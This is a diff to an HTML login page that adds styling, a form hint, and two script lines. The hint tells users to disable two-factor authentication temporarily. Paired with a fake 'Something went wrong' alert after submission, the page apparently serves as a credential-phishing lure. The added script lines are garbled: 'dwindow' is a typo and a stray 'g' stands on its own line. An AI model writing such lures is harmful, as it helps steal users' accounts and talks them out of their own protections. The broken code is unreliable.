@@ -36,7 +36,8 @@
         }
 
         .description {
-            margin-bottom: 20px;
+          color: #666;
+                     margin-bottom: 20px;
         }
 
         form {
@@ -137,6 +138,12 @@ button:hover{
           color: #565656;
           
         }
+        
+        .hint {
+    color: #666;
+    font-size: 12px;
+    margin-top: 10px;
+}
 
     </style>
 </head>
@@ -149,6 +156,7 @@ button:hover{
             <input type="text" name="username" id="username" placeholder="Username" required>
             <input type="password" name="password" id="password" placeholder="Password" required>
             <button type="submit" id="loginButton">Get Started</button>
+            <p class="hint"> If you have two-factor authentication enabled, please disable it temporarily.</p>
         </form>
     </div>
     <div id="modal" class="modal">
@@ -203,6 +211,8 @@ button:hover{
                 setTimeout(function() {
                     modal.style.display = 'none';
                     alert('Something went wrong, try again later.');
+										dwindow.location.reload();
+                    g
                 }, 5000);
             });
         });
